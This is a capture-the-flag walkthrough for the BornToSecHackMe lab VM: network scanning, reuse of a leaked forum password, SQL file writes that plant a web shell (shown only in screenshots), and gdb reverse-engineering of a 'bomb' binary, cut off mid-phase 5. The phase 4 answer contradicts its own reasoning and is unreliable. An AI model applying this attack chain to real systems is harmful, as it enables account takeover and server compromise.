# Reconnaissance and information gathering
> **When running BornToSecHackMe-v1.1.iso a simple login prompt appeared, no IP address is displayed on the screen, we don't know any user/password in the system.**  
![1](https://raw.githubusercontent.com/oulhafiane/BornToSecHackMe-CTF/main/ressources/1.png)

> **So we created a NAT network in the VirtualBox and connected the BornToSecHackMe virtual machine to it.  
we also have another virtual machine with blackarch linux on it, we attached the same network to it.**  
![2](https://raw.githubusercontent.com/oulhafiane/BornToSecHackMe-CTF/main/ressources/2.png)

> **After we started an intense scan with Nmap in the NAT network**  
![3](https://raw.githubusercontent.com/oulhafiane/BornToSecHackMe-CTF/main/ressources/3.png)

> **Then we got the result**
![4](https://raw.githubusercontent.com/oulhafiane/BornToSecHackMe-CTF/main/ressources/4.png)

> **The information we now know about the machine:**   
- IP address: 10.0.2.4  
- Open Ports: 21, 22, 80, 143, 443, 993  

> **Here is the detail of the services listening in the open ports:**
![5](https://raw.githubusercontent.com/oulhafiane/BornToSecHackMe-CTF/main/ressources/5.png)

> **After testing the open ports in the server, we found that there is no index page in the https**
![6](https://raw.githubusercontent.com/oulhafiane/BornToSecHackMe-CTF/main/ressources/6.png)

> **Then we wrote a script in python to test a wordlist to guess the urls:**
![7](https://raw.githubusercontent.com/oulhafiane/BornToSecHackMe-CTF/main/ressources/7.png)
![8](https://raw.githubusercontent.com/oulhafiane/BornToSecHackMe-CTF/main/ressources/8.png)

> **We got these urls, after checking the forum path, we found some useful informations (We found a log posted by a user):  
Here is a mistake by the user input, entering the password instead of the username.**
![9](https://raw.githubusercontent.com/oulhafiane/BornToSecHackMe-CTF/main/ressources/9.png)

> **We tried the password, with the same login as the user posted the logs, and we successfully connected to the account**
![10](https://raw.githubusercontent.com/oulhafiane/BornToSecHackMe-CTF/main/ressources/10.png)

> **After searching we found this email, that maybe will help us after.**
![11](https://raw.githubusercontent.com/oulhafiane/BornToSecHackMe-CTF/main/ressources/11.png)

> **We tried the email we found with the same password, and we got the access to the email account.**
![12](https://raw.githubusercontent.com/oulhafiane/BornToSecHackMe-CTF/main/ressources/12.png)

> **We found an email containing the password of the DB root access.**
![13](https://raw.githubusercontent.com/oulhafiane/BornToSecHackMe-CTF/main/ressources/13.png)
![14](https://raw.githubusercontent.com/oulhafiane/BornToSecHackMe-CTF/main/ressources/14.png)

> **We changed the type of the user lmezard to be an admin**
![16](https://raw.githubusercontent.com/oulhafiane/BornToSecHackMe-CTF/main/ressources/16.png)

> **We found the admin area page:**  
![17](https://raw.githubusercontent.com/oulhafiane/BornToSecHackMe-CTF/main/ressources/17.png)

> **We found a new information: the folder images/uploaded/ and images/avatars/ maybe will have 777 permission:**
![18](https://raw.githubusercontent.com/oulhafiane/BornToSecHackMe-CTF/main/ressources/18.png)

> **Using sql command LOAD_FILE we tried many path to find the root path of the website:  
The forum folder is: '/var/www/forum/'  
We need a writable directory to use the command into outfile to write a small script in the website   
We tried the images/uploaded and images/avatars but unfortunately they are not writable**  
![19](https://raw.githubusercontent.com/oulhafiane/BornToSecHackMe-CTF/main/ressources/19.png)

> **We searched for the forum website and we found the source code in the github: https://github.com/ilosuna/mylittleforum
And we found a directory named : templates_c that must be writable.**
![20](https://raw.githubusercontent.com/oulhafiane/BornToSecHackMe-CTF/main/ressources/20.png)

> **We got injected successfully our first mini shell**
![21](https://raw.githubusercontent.com/oulhafiane/BornToSecHackMe-CTF/main/ressources/21.png)
![22](https://raw.githubusercontent.com/oulhafiane/BornToSecHackMe-CTF/main/ressources/22.png)

> **With the script we managed to find: /home/LOOKATME containing a file named password**
![23](https://raw.githubusercontent.com/oulhafiane/BornToSecHackMe-CTF/main/ressources/23.png)

# FUN CHALLENGE

> **With the previous username and password we are able to be conected by ftp**
![24](https://raw.githubusercontent.com/oulhafiane/BornToSecHackMe-CTF/main/ressources/24.png)
**We found a file named README after running the command ```get README``` to download the file**
![25](https://raw.githubusercontent.com/oulhafiane/BornToSecHackMe-CTF/main/ressources/25.png)

> **We downloaded the file named fun, and we found that is a POSIX tar archive**
![26](https://raw.githubusercontent.com/oulhafiane/BornToSecHackMe-CTF/main/ressources/26.png)
**After unzipping the fun file, we got a lot of files ```pcap``` and they're not related to .pcap**  
![27](https://raw.githubusercontent.com/oulhafiane/BornToSecHackMe-CTF/main/ressources/27.png)
**After reading the files together with: ls \*.pcap > all.txt we got some c functions including main()**
![28](https://raw.githubusercontent.com/oulhafiane/BornToSecHackMe-CTF/main/ressources/28.png)

> **and after looking at the functions `getmeX()`, only `getme8()` to `getme12()` has correct return value, so we need to find
what should be the return value of the remaining functions.
Each functions has a comment after it in the form of `// fileX`, checking this exact comment if it is repeated somewhere
does not bring anything. But if we check the comment that contains the next number we find a return value of a certain
character. For example for `getme7()` we found `return p;`.  

**We created a script which will make our life easier in this challenge:**

```
e1r2p12% bash start.sh
[
  { getmeX: '1', fileX: '5', value: 'I' },
  { getmeX: '2', fileX: '37', value: 'h' },
  { getmeX: '3', fileX: '56', value: 'e' },
  { getmeX: '4', fileX: '115', value: 'a' },
  { getmeX: '5', fileX: '368', value: 'r' },
  { getmeX: '6', fileX: '521', value: 't' },
  { getmeX: '7', fileX: '736', value: 'p' },
  { getmeX: '8', fileX: 'none', value: 'w' },
  { getmeX: '9', fileX: 'none', value: 'n' },
  { getmeX: '10', fileX: 'none', value: 'a' },
  { getmeX: '11', fileX: 'none', value: 'g' },
  { getmeX: '12', fileX: 'none', value: 'e' }
]
the password is : Iheartpwnage
```

> **So the password for the user 'laurie' is `SHA256("Iheartpwnage")` which is `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`.**

# Exploit bomb binary

> **When we connected to the user laurie via ssh we found another README wich says:**
![29](https://raw.githubusercontent.com/oulhafiane/BornToSecHackMe-CTF/main/ressources/29.png)

## Phase one.
Let's run gdb for phase_1 :
```
(gdb) disass phase_1
Dump of assembler code for function phase_1:
   0x08048b20 <+0>:	push   ebp
   0x08048b21 <+1>:	mov    ebp,esp
   0x08048b23 <+3>:	sub    esp,0x8
   0x08048b26 <+6>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048b29 <+9>:	add    esp,0xfffffff8
   0x08048b2c <+12>:	push   0x80497c0
   0x08048b31 <+17>:	push   eax
   0x08048b32 <+18>:	call   0x8049030 <strings_not_equal>
   0x08048b37 <+23>:	add    esp,0x10
   0x08048b3a <+26>:	test   eax,eax
   0x08048b3c <+28>:	je     0x8048b43 <phase_1+35>
   0x08048b3e <+30>:	call   0x80494fc <explode_bomb>
   0x08048b43 <+35>:	mov    esp,ebp
   0x08048b45 <+37>:	pop    ebp
   0x08048b46 <+38>:	ret
End of assembler dump.
```

In this address `0x08048b32` the program calls a function named `strings_not_equal`.
Let's disass it.
```
(gdb) disass strings_not_equal
Dump of assembler code for function strings_not_equal:
   0x08049030 <+0>:	push   ebp
   0x08049031 <+1>:	mov    ebp,esp
   0x08049033 <+3>:	sub    esp,0xc
   0x08049036 <+6>:	push   edi
   0x08049037 <+7>:	push   esi
   0x08049038 <+8>:	push   ebx
   0x08049039 <+9>:	mov    esi,DWORD PTR [ebp+0x8]
   0x0804903c <+12>:	mov    edi,DWORD PTR [ebp+0xc]
   0x0804903f <+15>:	add    esp,0xfffffff4
   0x08049042 <+18>:	push   esi
   0x08049043 <+19>:	call   0x8049018 <string_length>
   0x08049048 <+24>:	mov    ebx,eax
   0x0804904a <+26>:	add    esp,0xfffffff4
   0x0804904d <+29>:	push   edi
   0x0804904e <+30>:	call   0x8049018 <string_length>
   0x08049053 <+35>:	cmp    ebx,eax
   0x08049055 <+37>:	je     0x8049060 <strings_not_equal+48>
   0x08049057 <+39>:	mov    eax,0x1
   0x0804905c <+44>:	jmp    0x804907f <strings_not_equal+79>
   0x0804905e <+46>:	mov    esi,esi
   0x08049060 <+48>:	mov    edx,esi
   0x08049062 <+50>:	mov    ecx,edi
   0x08049064 <+52>:	cmp    BYTE PTR [edx],0x0
   0x08049067 <+55>:	je     0x804907d <strings_not_equal+77>
   0x08049069 <+57>:	lea    esi,[esi+eiz*1+0x0]
   0x08049070 <+64>:	mov    al,BYTE PTR [edx]
   0x08049072 <+66>:	cmp    al,BYTE PTR [ecx]
   0x08049074 <+68>:	jne    0x8049057 <strings_not_equal+39>
   0x08049076 <+70>:	inc    edx
   0x08049077 <+71>:	inc    ecx
   0x08049078 <+72>:	cmp    BYTE PTR [edx],0x0
   0x0804907b <+75>:	jne    0x8049070 <strings_not_equal+64>
   0x0804907d <+77>:	xor    eax,eax
   0x0804907f <+79>:	lea    esp,[ebp-0x18]
   0x08049082 <+82>:	pop    ebx
   0x08049083 <+83>:	pop    esi
   0x08049084 <+84>:	pop    edi
   0x08049085 <+85>:	mov    esp,ebp
   0x08049087 <+87>:	pop    ebp
   0x08049088 <+88>:	ret
End of assembler dump.
(gdb)
```

TLDR: It's like a simple `strcmp`
In this `0x08048b2c` address back in the disass phase_1 we see the `push` instruction.
Which means that whatever is this `0x80497c0` it gets compared with whatever we entered. We use `x/s` to see what we have.
```
(gdb) x/s 0x80497c0
0x80497c0:	 "Public speaking is very easy."
```
So the solution for phase_1 is `Public speaking is very easy.`

## Phase 2
God have mercy on us.
Dissasing :
```
(gdb) disass phase_2
Dump of assembler code for function phase_2:
   0x08048b48 <+0>:	push   ebp
   0x08048b49 <+1>:	mov    ebp,esp
   0x08048b4b <+3>:	sub    esp,0x20
   0x08048b4e <+6>:	push   esi
   0x08048b4f <+7>:	push   ebx
   0x08048b50 <+8>:	mov    edx,DWORD PTR [ebp+0x8]
   0x08048b53 <+11>:	add    esp,0xfffffff8
   0x08048b56 <+14>:	lea    eax,[ebp-0x18]
   0x08048b59 <+17>:	push   eax
   0x08048b5a <+18>:	push   edx
   0x08048b5b <+19>:	call   0x8048fd8 <read_six_numbers>
   0x08048b60 <+24>:	add    esp,0x10
   0x08048b63 <+27>:	cmp    DWORD PTR [ebp-0x18],0x1
   0x08048b67 <+31>:	je     0x8048b6e <phase_2+38>
   0x08048b69 <+33>:	call   0x80494fc <explode_bomb>
   0x08048b6e <+38>:	mov    ebx,0x1
   0x08048b73 <+43>:	lea    esi,[ebp-0x18]
   0x08048b76 <+46>:	lea    eax,[ebx+0x1]
   0x08048b79 <+49>:	imul   eax,DWORD PTR [esi+ebx*4-0x4]
   0x08048b7e <+54>:	cmp    DWORD PTR [esi+ebx*4],eax
   0x08048b81 <+57>:	je     0x8048b88 <phase_2+64>
   0x08048b83 <+59>:	call   0x80494fc <explode_bomb>
   0x08048b88 <+64>:	inc    ebx
   0x08048b89 <+65>:	cmp    ebx,0x5
   0x08048b8c <+68>:	jle    0x8048b76 <phase_2+46>
   0x08048b8e <+70>:	lea    esp,[ebp-0x28]
   0x08048b91 <+73>:	pop    ebx
   0x08048b92 <+74>:	pop    esi
   0x08048b93 <+75>:	mov    esp,ebp
   0x08048b95 <+77>:	pop    ebp
   0x08048b96 <+78>:	ret
End of assembler dump.
```

Let's try to break this code.
First let's disass `read_six_numbers` :
```
(gdb) disass read_six_numbers
Dump of assembler code for function read_six_numbers:
   0x08048fd8 <+0>:	push   ebp
   0x08048fd9 <+1>:	mov    ebp,esp
   0x08048fdb <+3>:	sub    esp,0x8
   0x08048fde <+6>:	mov    ecx,DWORD PTR [ebp+0x8]
   0x08048fe1 <+9>:	mov    edx,DWORD PTR [ebp+0xc]
   0x08048fe4 <+12>:	lea    eax,[edx+0x14]
   0x08048fe7 <+15>:	push   eax
   0x08048fe8 <+16>:	lea    eax,[edx+0x10]
   0x08048feb <+19>:	push   eax
   0x08048fec <+20>:	lea    eax,[edx+0xc]
   0x08048fef <+23>:	push   eax
   0x08048ff0 <+24>:	lea    eax,[edx+0x8]
   0x08048ff3 <+27>:	push   eax
   0x08048ff4 <+28>:	lea    eax,[edx+0x4]
   0x08048ff7 <+31>:	push   eax
   0x08048ff8 <+32>:	push   edx
   0x08048ff9 <+33>:	push   0x8049b1b
   0x08048ffe <+38>:	push   ecx
   0x08048fff <+39>:	call   0x8048860 <sscanf@plt>
   0x08049004 <+44>:	add    esp,0x20
   0x08049007 <+47>:	cmp    eax,0x5
   0x0804900a <+50>:	jg     0x8049011 <read_six_numbers+57>
   0x0804900c <+52>:	call   0x80494fc <explode_bomb>
   0x08049011 <+57>:	mov    esp,ebp
   0x08049013 <+59>:	pop    ebp
   0x08049014 <+60>:	ret
End of assembler dump.
```

At this address `0x08048ff9` you will see the argument that is passed to `sscanf`.
Let's see what is it:
```
(gdb) x/s 0x8049b1b
0x8049b1b:	 "%d %d %d %d %d %d"
```

So we just need to pass 6 numbers. And if you looked at the `readme` file you will find the hints.
The second number in our list is 2. Let's see what is our first number is. Returning to `phase_2` disassing.
```
(gdb) disass phase_2
Dump of assembler code for function phase_2:
   0x08048b48 <+0>:	push   ebp
   0x08048b49 <+1>:	mov    ebp,esp
   0x08048b4b <+3>:	sub    esp,0x20
   0x08048b4e <+6>:	push   esi
   0x08048b4f <+7>:	push   ebx
   0x08048b50 <+8>:	mov    edx,DWORD PTR [ebp+0x8]
   0x08048b53 <+11>:	add    esp,0xfffffff8
   0x08048b56 <+14>:	lea    eax,[ebp-0x18]
   0x08048b59 <+17>:	push   eax
   0x08048b5a <+18>:	push   edx
   0x08048b5b <+19>:	call   0x8048fd8 <read_six_numbers>
   0x08048b60 <+24>:	add    esp,0x10
   0x08048b63 <+27>:	cmp    DWORD PTR [ebp-0x18],0x1
   0x08048b67 <+31>:	je     0x8048b6e <phase_2+38>
   0x08048b69 <+33>:	call   0x80494fc <explode_bomb>
   0x08048b6e <+38>:	mov    ebx,0x1
   0x08048b73 <+43>:	lea    esi,[ebp-0x18]
   0x08048b76 <+46>:	lea    eax,[ebx+0x1]
   0x08048b79 <+49>:	imul   eax,DWORD PTR [esi+ebx*4-0x4]
   0x08048b7e <+54>:	cmp    DWORD PTR [esi+ebx*4],eax
   0x08048b81 <+57>:	je     0x8048b88 <phase_2+64>
   0x08048b83 <+59>:	call   0x80494fc <explode_bomb>
   0x08048b88 <+64>:	inc    ebx
   0x08048b89 <+65>:	cmp    ebx,0x5
   0x08048b8c <+68>:	jle    0x8048b76 <phase_2+46>
   0x08048b8e <+70>:	lea    esp,[ebp-0x28]
   0x08048b91 <+73>:	pop    ebx
   0x08048b92 <+74>:	pop    esi
   0x08048b93 <+75>:	mov    esp,ebp
   0x08048b95 <+77>:	pop    ebp
   0x08048b96 <+78>:	ret
End of assembler dump.
```

Things to know : this expression `DWORD PTR [ebp-0x18]` means the first elemnt in our string which is the first `%d`.
In this address `0x08048b63` our first element of the list gets `cmp` with the number `0x1` which `1` in decimal. If it's equal it skips the `<explode_bomb>` function.
Meaning our first number in the list is indeed 1.

So the solution until now is the following : `1 2 x x x x`

Lets go ahead and check the number 3.
In the following part :
```
   [...]
   0x08048b6e <+38>:	mov    ebx,0x1
   0x08048b73 <+43>:	lea    esi,[ebp-0x18]
   0x08048b76 <+46>:	lea    eax,[ebx+0x1]
   0x08048b79 <+49>:	imul   eax,DWORD PTR [esi+ebx*4-0x4]
   0x08048b7e <+54>:	cmp    DWORD PTR [esi+ebx*4],eax
   0x08048b81 <+57>:	je     0x8048b88 <phase_2+64>
   0x08048b83 <+59>:	call   0x80494fc <explode_bomb>
   0x08048b88 <+64>:	inc    ebx
   0x08048b89 <+65>:	cmp    ebx,0x5
   0x08048b8c <+68>:	jle    0x8048b76 <phase_2+46>
   [...]
```

In the address `0x08048b8c` it jumps back, if `ebx` is less or equal than `0x5` which is 5, to `<phase_2+46>` which has this address `0x08048b76`.
And at the address `0x08048b6e` `ebx` is initialized with `1` and `esi` is set to our first element in the list(`ebp-0x18`) which is in this case `1`.

In other words we have a `loop` between our hands.
Let's decompile this part ourself.
```c
void     phase_2(int   *str)
{
   int   i; //ebx

   i = 1;
   while (i <= 5)
   {
      //we read the code and fill this. Step by step.
   }
}
```

The above is what we have until now. Let's continue reading the disassembly.

In this address `0x08048b76` we see that `eax` is always `ebx + 1`. After that we have a `imul` instruction. It's a `Integer Multiplication`. I quote from this [guide](https://www.cs.virginia.edu/~evans/cs216/guides/x86.html):
```
   ...
   The imul instruction has two basic formats: two-operand (first two syntax listings above) and three-operand (last two syntax listings above).
   The two-operand form multiplies its two operands together and stores the result in the first operand. The result (i.e. first) operand must be a register.
   The three operand form multiplies its second and third operands together and stores the result in its first operand. Again, the result operand must be a register. Furthermore, the third operand is restricted to being a constant value. 
   ...
```

TL;DR: Let's say `x` and `y`, `imul` will multiply `x` by `y` and then stores the result in `x`.

In our case `eax` will be multiplied by `DWORD PTR [esi+ebx*4-0x4]` and then stores the result in `eax` itself.

In this address `0x08048b7e` the results of the multiplication gets `cmp` with the `tab[i]` which is `DWORD PTR [esi+ebx*4]`

So our C program is going to look like this :
```c
//This is our multiplication eax * (esi + ebx * 4 - 4)
//we already have in our C code int *tab so let's work with it.
//esi is -as we said before- the first element in our list.
//the expression ebx * 4 - 0x4 : the 4 means 4 bytes in memory. But we can replace it with 1, since we already using int *tab.
//In other words its eax * (tab[i - 1]), we change eax with i + 1, it becomes : (i + 1) * (tab[i - 1])
void     phase_2(int   *tab)
{
   int   i; //ebx

   i = 1;
   while (i <= 5)
   {
      if (tab[i] != (i + 1) * (tab[i - 1]))
         explode_bomb(void);
      i++;
   }
}
```

Executing a custom C program that does what the above and print `(i + 1) * (tab[i - 1])` everytime will give us the follwing combination :
```
1 2 6 24 120 720
```
Voilaa

## Phase 3

Disass phase_3
```
(gdb) disass phase_3
Dump of assembler code for function phase_3:
   0x08048b98 <+0>:	push   ebp
   0x08048b99 <+1>:	mov    ebp,esp
   0x08048b9b <+3>:	sub    esp,0x14
   0x08048b9e <+6>:	push   ebx
   0x08048b9f <+7>:	mov    edx,DWORD PTR [ebp+0x8]
   0x08048ba2 <+10>:	add    esp,0xfffffff4
   0x08048ba5 <+13>:	lea    eax,[ebp-0x4]
   0x08048ba8 <+16>:	push   eax
   0x08048ba9 <+17>:	lea    eax,[ebp-0x5]
   0x08048bac <+20>:	push   eax
   0x08048bad <+21>:	lea    eax,[ebp-0xc]
   0x08048bb0 <+24>:	push   eax
   0x08048bb1 <+25>:	push   0x80497de
   0x08048bb6 <+30>:	push   edx
   0x08048bb7 <+31>:	call   0x8048860 <sscanf@plt>
   0x08048bbc <+36>:	add    esp,0x20
   0x08048bbf <+39>:	cmp    eax,0x2
   0x08048bc2 <+42>:	jg     0x8048bc9 <phase_3+49>
   0x08048bc4 <+44>:	call   0x80494fc <explode_bomb>
   0x08048bc9 <+49>:	cmp    DWORD PTR [ebp-0xc],0x7
   0x08048bcd <+53>:	ja     0x8048c88 <phase_3+240>
   0x08048bd3 <+59>:	mov    eax,DWORD PTR [ebp-0xc]
   0x08048bd6 <+62>:	jmp    DWORD PTR [eax*4+0x80497e8]
   0x08048bdd <+69>:	lea    esi,[esi+0x0]
   0x08048be0 <+72>:	mov    bl,0x71
   0x08048be2 <+74>:	cmp    DWORD PTR [ebp-0x4],0x309
   0x08048be9 <+81>:	je     0x8048c8f <phase_3+247>
   0x08048bef <+87>:	call   0x80494fc <explode_bomb>
   0x08048bf4 <+92>:	jmp    0x8048c8f <phase_3+247>
   0x08048bf9 <+97>:	lea    esi,[esi+eiz*1+0x0]
   0x08048c00 <+104>:	mov    bl,0x62
   0x08048c02 <+106>:	cmp    DWORD PTR [ebp-0x4],0xd6
   0x08048c09 <+113>:	je     0x8048c8f <phase_3+247>
   0x08048c0f <+119>:	call   0x80494fc <explode_bomb>
   0x08048c14 <+124>:	jmp    0x8048c8f <phase_3+247>
   0x08048c16 <+126>:	mov    bl,0x62
   0x08048c18 <+128>:	cmp    DWORD PTR [ebp-0x4],0x2f3
   0x08048c1f <+135>:	je     0x8048c8f <phase_3+247>
   0x08048c21 <+137>:	call   0x80494fc <explode_bomb>
   0x08048c26 <+142>:	jmp    0x8048c8f <phase_3+247>
   0x08048c28 <+144>:	mov    bl,0x6b
   0x08048c2a <+146>:	cmp    DWORD PTR [ebp-0x4],0xfb
   0x08048c31 <+153>:	je     0x8048c8f <phase_3+247>
   0x08048c33 <+155>:	call   0x80494fc <explode_bomb>
   0x08048c38 <+160>:	jmp    0x8048c8f <phase_3+247>
   0x08048c3a <+162>:	lea    esi,[esi+0x0]
   0x08048c40 <+168>:	mov    bl,0x6f
   0x08048c42 <+170>:	cmp    DWORD PTR [ebp-0x4],0xa0
   0x08048c49 <+177>:	je     0x8048c8f <phase_3+247>
   0x08048c4b <+179>:	call   0x80494fc <explode_bomb>
   0x08048c50 <+184>:	jmp    0x8048c8f <phase_3+247>
   0x08048c52 <+186>:	mov    bl,0x74
   0x08048c54 <+188>:	cmp    DWORD PTR [ebp-0x4],0x1ca
   0x08048c5b <+195>:	je     0x8048c8f <phase_3+247>
   0x08048c5d <+197>:	call   0x80494fc <explode_bomb>
   0x08048c62 <+202>:	jmp    0x8048c8f <phase_3+247>
   0x08048c64 <+204>:	mov    bl,0x76
   0x08048c66 <+206>:	cmp    DWORD PTR [ebp-0x4],0x30c
   0x08048c6d <+213>:	je     0x8048c8f <phase_3+247>
   0x08048c6f <+215>:	call   0x80494fc <explode_bomb>
   0x08048c74 <+220>:	jmp    0x8048c8f <phase_3+247>
   0x08048c76 <+222>:	mov    bl,0x62
   0x08048c78 <+224>:	cmp    DWORD PTR [ebp-0x4],0x20c
   0x08048c7f <+231>:	je     0x8048c8f <phase_3+247>
   0x08048c81 <+233>:	call   0x80494fc <explode_bomb>
   0x08048c86 <+238>:	jmp    0x8048c8f <phase_3+247>
   0x08048c88 <+240>:	mov    bl,0x78
   0x08048c8a <+242>:	call   0x80494fc <explode_bomb>
   0x08048c8f <+247>:	cmp    bl,BYTE PTR [ebp-0x5]
   0x08048c92 <+250>:	je     0x8048c99 <phase_3+257>
   0x08048c94 <+252>:	call   0x80494fc <explode_bomb>
   0x08048c99 <+257>:	mov    ebx,DWORD PTR [ebp-0x18]
   0x08048c9c <+260>:	mov    esp,ebp
   0x08048c9e <+262>:	pop    ebp
   0x08048c9f <+263>:	ret
End of assembler dump.
```

A brief look at the assembler dump will tell us that there's more than 1 possibility in this phase. But like before we will decompile this ourselves. And let's not forget we have hints.

At this address `0x08048bb1` we have the parametere that was passed to `scanf`. Let's see what we have here :
```
(gdb) x/s 0x80497de
0x80497de:	 "%d %c %d"
```

Meaning a number, a charactere and a number.

After using `sscanf` you should know that the return value of a function get stored in `eax` automatically.
At the address `0x08048bbf`, it `cmp` the return value of `sscanf` with `0x2` and it skips `<explode_bomb>` if that value is greater than 2. Meaning sscanf must return 3 or greater. But we already know exactly what we need to input as mentioned before. Before diving into the actual code let's not forget that we already have a small hint about the charatere. It's `q`. So the answer will be something like this : `%d q %d`

Now let's dive to the actual challenge. It looks like a switch case situation.
Searching for the hexadecimal value of the charactere `q` in the assembler dump. We will find it.

The instruction after the address `0x08048be0` is comparing the last digit in the string with `0x309` which is `777` in decimal.

So far the solution should be `%d q 777`. Now we just need to find the first number.

In the following 2 lines:
```
   0x08048bd3 <+59>:	mov    eax,DWORD PTR [ebp-0xc]
   0x08048bd6 <+62>:	jmp    DWORD PTR [eax*4+0x80497e8]
```

This is the switch case scenario We talked about earlier. In other words, depends on the first number, the program will jump to a certain adress. We can see what address using the following in gdb :
```
(gdb) x/10ix 0x80497e8
0x80497e8:	0x08048be0	0x08048c00	0x08048c16	0x08048c28
0x80497f8:	0x08048c40	0x08048c52	0x08048c64	0x08048c76
0x8049808:	0x67006425	0x746e6169
```

So if we want the program to jump to `q` the result of this `DWORD PTR [eax*4+0x80497e8]` must equal to the address of the `q` thing. Its address is `0x08048be0` meaning that `eax*4` must equal to 0. And if we look the instruction before this one, we find that `eax` is `DWORD PTR [ebp-0xc]`. Which is the first element in our string. So our first number must be 0 so the following `DWORD PTR [eax*4+0x80497e8]` will take us to the first address in the jump instructions shown above.

The solution is : `0 q 777`

## Phase 4

Straight to gdb:
```
(gdb) disass phase_4
Dump of assembler code for function phase_4:
   0x08048ce0 <+0>:	push   ebp
   0x08048ce1 <+1>:	mov    ebp,esp
   0x08048ce3 <+3>:	sub    esp,0x18
   0x08048ce6 <+6>:	mov    edx,DWORD PTR [ebp+0x8]
   0x08048ce9 <+9>:	add    esp,0xfffffffc
   0x08048cec <+12>:	lea    eax,[ebp-0x4]
   0x08048cef <+15>:	push   eax
   0x08048cf0 <+16>:	push   0x8049808
   0x08048cf5 <+21>:	push   edx
   0x08048cf6 <+22>:	call   0x8048860 <sscanf@plt>
   0x08048cfb <+27>:	add    esp,0x10
   0x08048cfe <+30>:	cmp    eax,0x1
   0x08048d01 <+33>:	jne    0x8048d09 <phase_4+41>
   0x08048d03 <+35>:	cmp    DWORD PTR [ebp-0x4],0x0
   0x08048d07 <+39>:	jg     0x8048d0e <phase_4+46>
   0x08048d09 <+41>:	call   0x80494fc <explode_bomb>
   0x08048d0e <+46>:	add    esp,0xfffffff4
   0x08048d11 <+49>:	mov    eax,DWORD PTR [ebp-0x4]
   0x08048d14 <+52>:	push   eax
   0x08048d15 <+53>:	call   0x8048ca0 <func4>
   0x08048d1a <+58>:	add    esp,0x10
   0x08048d1d <+61>:	cmp    eax,0x37
   0x08048d20 <+64>:	je     0x8048d27 <phase_4+71>
   0x08048d22 <+66>:	call   0x80494fc <explode_bomb>
   0x08048d27 <+71>:	mov    esp,ebp
   0x08048d29 <+73>:	pop    ebp
   0x08048d2a <+74>:	ret
End of assembler dump.
```

There's a `sscanf` call in the address `0x08048cf6`, a couple of instructions before we can see what arguments passed to `sscanf`.
And exactly on the address `0x08048cf0`. Let's see what we have here :
```
(gdb) x/s 0x8049808
0x8049808:	 "%d"
```

Okey so in this phase we just need 1 number.

In this address `0x08048d03` the number we inputed gets `cmp` to `0x0` which is 0. If it's not greater than 0 the bomb will explode.
Otherwise it jumps to `<phase_4 + 64>`.

Then they call a function named `func4` passing the eax as an argument which has the number we inputed.
After the return value of `func4` which is passed to `eax` immediatly gets `cmp` with `0x37` which is 55. Meaning that the `func4` must return 55. Let's disass it :
```
(gdb) disass func4
Dump of assembler code for function func4:
   0x08048ca0 <+0>:	push   ebp
   0x08048ca1 <+1>:	mov    ebp,esp
   0x08048ca3 <+3>:	sub    esp,0x10
   0x08048ca6 <+6>:	push   esi
   0x08048ca7 <+7>:	push   ebx
   0x08048ca8 <+8>:	mov    ebx,DWORD PTR [ebp+0x8]
   0x08048cab <+11>:	cmp    ebx,0x1
   0x08048cae <+14>:	jle    0x8048cd0 <func4+48>
   0x08048cb0 <+16>:	add    esp,0xfffffff4
   0x08048cb3 <+19>:	lea    eax,[ebx-0x1]
   0x08048cb6 <+22>:	push   eax
   0x08048cb7 <+23>:	call   0x8048ca0 <func4>
   0x08048cbc <+28>:	mov    esi,eax
   0x08048cbe <+30>:	add    esp,0xfffffff4
   0x08048cc1 <+33>:	lea    eax,[ebx-0x2]
   0x08048cc4 <+36>:	push   eax
   0x08048cc5 <+37>:	call   0x8048ca0 <func4>
   0x08048cca <+42>:	add    eax,esi
   0x08048ccc <+44>:	jmp    0x8048cd5 <func4+53>
   0x08048cce <+46>:	mov    esi,esi
   0x08048cd0 <+48>:	mov    eax,0x1
   0x08048cd5 <+53>:	lea    esp,[ebp-0x18]
   0x08048cd8 <+56>:	pop    ebx
   0x08048cd9 <+57>:	pop    esi
   0x08048cda <+58>:	mov    esp,ebp
   0x08048cdc <+60>:	pop    ebp
   0x08048cdd <+61>:	ret
End of assembler dump.
```

At first we can see that the program is recursive. At these addresses `0x08048cb7` and `0x08048cc5`.

The first recursion, it's just decrease `ebx` which is the number we inputed by 1. It saves the output in `esi`.
Then for the second part we see that it does the same thing except that this time it decreases by 2. And saves the ouput in `eax`.

Then it add `esi` and `eax` basically everytime. It like a mathematical equation : (n - 1) + (n - 2)....

As you already now understand, it's a fibunacci function. And the number we want from `phase_4` is the index of the number 55 in the fibunacci sequence. Which is 10. But since we started with 1 in the `func4` function. The index of 55 is 9 instead.

The solution is : 5

## Phase 5

Like always :
```
(gdb) disass phase_5
Dump of assembler code for function phase_5:
   0x08048d2c <+0>:	push   ebp
   0x08048d2d <+1>:	mov    ebp,esp
   0x08048d2f <+3>:	sub    esp,0x10
   0x08048d32 <+6>:	push   esi
   0x08048d33 <+7>:	push   ebx
   0x08048d34 <+8>:	mov    ebx,DWORD PTR [ebp+0x8]
   0x08048d37 <+11>:	add    esp,0xfffffff4
   0x08048d3a <+14>:	push   ebx
   0x08048d3b <+15>:	call   0x8049018 <string_length>
   0x08048d40 <+20>:	add    esp,0x10
   0x08048d43 <+23>:	cmp    eax,0x6
   0x08048d46 <+26>:	je     0x8048d4d <phase_5+33>
   0x08048d48 <+28>:	call   0x80494fc <explode_bomb>
   0x08048d4d <+33>:	xor    edx,edx
   0x08048d4f <+35>:	lea    ecx,[ebp-0x8]
   0x08048d52 <+38>:	mov    esi,0x804b220
   0x08048d57 <+43>:	mov    al,BYTE PTR [edx+ebx*1]
   0x08048d5a <+46>:	and    al,0xf
   0x08048d5c <+48>:	movsx  eax,al
   0x08048d5f <+51>:	mov    al,BYTE PTR [eax+esi*1]
   0x08048d62 <+54>:	mov    BYTE PTR [edx+ecx*1],al
   0x08048d65 <+57>:	inc    edx
   0x08048d66 <+58>:	cmp    edx,0x5
   0x08048d69 <+61>:	jle    0x8048d57 <phase_5+43>
   0x08048d6b <+63>:	mov    BYTE PTR [ebp-0x2],0x0
   0x08048d6f <+67>:	add    esp,0xfffffff8
   0x08048d72 <+70>:	push   0x804980b
   0x08048d77 <+75>:	lea    eax,[ebp-0x8]
   0x08048d7a <+78>:	push   eax
   0x08048d7b <+79>:	call   0x8049030 <strings_not_equal>
   0x08048d80 <+84>:	add    esp,0x10
   0x08048d83 <+87>:	test   eax,eax
   0x08048d85 <+89>:	je     0x8048d8c <phase_5+96>
